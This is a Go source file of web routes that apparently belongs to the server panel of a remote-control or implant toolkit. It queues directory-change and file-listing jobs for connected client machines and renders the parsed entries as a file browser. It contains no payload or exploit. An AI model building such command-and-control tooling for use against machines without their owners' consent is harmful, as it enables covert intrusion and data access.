package routes

import (
	"fmt"
	"net/http"
	"strconv"
	"strings"

	"github.com/gofiber/fiber/v2"
	"github.com/ngn13/shrk/server/database"
	"github.com/ngn13/shrk/server/joblist"
	"github.com/ngn13/shrk/server/log"
	"github.com/ngn13/shrk/server/util"
)

type entry struct {
	Name  string
	IsDir bool
	Mode  int64
	UID   int64
	GID   int64
	Size  uint64
	MTime int64
	CTime int64
}

func newEntry(s string) (*entry, error) {
	var (
		sects []string
		ent   entry
		err   error
	)

	if s == "" {
		return nil, fmt.Errorf("entry is empty")
	}

	if sects = strings.Split(s, "/"); len(sects) < 8 {
		return nil, fmt.Errorf("entry doesn't contain enough sections")
	}

	ent.Name = sects[0]
	ent.IsDir = sects[1] == "1"

	if ent.Mode, err = strconv.ParseInt(sects[2], 10, 32); err != nil {
		return nil, fmt.Errorf("failed to parse the entry mode: %s", err.Error())
	}

	if ent.UID, err = strconv.ParseInt(sects[3], 10, 32); err != nil {
		return nil, fmt.Errorf("failed to parse the entry UID: %s", err.Error())
	}

	if ent.GID, err = strconv.ParseInt(sects[4], 10, 32); err != nil {
		return nil, fmt.Errorf("failed to parse the entry GID: %s", err.Error())
	}

	if ent.Size, err = strconv.ParseUint(sects[5], 10, 64); err != nil {
		return nil, fmt.Errorf("failed to parse the entry size: %s", err.Error())
	}

	if ent.MTime, err = strconv.ParseInt(sects[6], 10, 64); err != nil {
		return nil, fmt.Errorf("failed to parse the entry modification time: %s", err.Error())
	}

	if ent.CTime, err = strconv.ParseInt(sects[7], 10, 64); err != nil {
		return nil, fmt.Errorf("failed to parse the entry creation time: %s", err.Error())
	}

	return &ent, nil
}

func filesChdir(c *fiber.Ctx, client *database.Client, jobs *joblist.Type) (bool, error) {
	var (
		job     *joblist.Job
		res_str string
		dirp    string
		err     error
	)

	if dirp = c.Query("p"); dirp == "" {
		dirp = "/"
	}

	data := util.NewBuffer(dirp)
	res := util.NewBuffer()

	if job, err = jobs.Add(client.ID, joblist.CMD_CHDIR, data, res); err != nil {
		log.Fail("failed to directory change job: %s", err.Error())
		return false, util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	defer jobs.Del(job.ID)

	if !job.Wait() {
		log.Debg("directory change job timeouted for %s", client.ID)
		return false, util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
	}

	if res_str = res.String(); res_str != "success" {
		return false, util.Render(c, "files", fiber.Map{
			"dir":    dirp,
			"client": client,
			"error":  res_str,
		})
	}

	return true, nil
}

func filesList(c *fiber.Ctx, client *database.Client, jobs *joblist.Type) (bool, error) {
	var (
		job *joblist.Job

		ent      *entry
		entries  []*entry
		ents_str []string

		res_str string
		dirp    string

		err error
	)

	data := util.NewBuffer("-")
	res := util.NewBuffer()

	if job, err = jobs.Add(client.ID, joblist.CMD_LIST, data, res); err != nil {
		log.Fail("failed to add file listing job: %s", err.Error())
		return false, util.RenderErr(c, "server error", http.StatusInternalServerError)
	}

	defer jobs.Del(job.ID)

	if !job.Wait() {
		log.Debg("file listing job timed out for %s", client.ID)
		return false, util.RenderErr(c, "client timeout", http.StatusGatewayTimeout)
	}

	res_str = res.String()
	ents_str = strings.Split(res_str, "//")

	for _, s := range ents_str {
		if ent, err = newEntry(s); err != nil {
			log.Debg("failed to load the entry from \"%s\": %s", s, err.Error())
			continue
		}
		entries = append(entries, ent)
	}

	return true, util.Render(c, "files", fiber.Map{
		"dir":     dirp,
		"client":  client,
		"entries": entries,
	})
}

func GET_files(c *fiber.Ctx) error {
	var (
		client *database.Client
		jobs   *joblist.Type
	)

	client = c.Locals("client").(*database.Client)
	jobs = c.Locals("joblist").(*joblist.Type)

	if ok, err := filesChdir(c, client, jobs); !ok {
		return err
	}

	_, err := filesList(c, client, jobs)
	return err
}
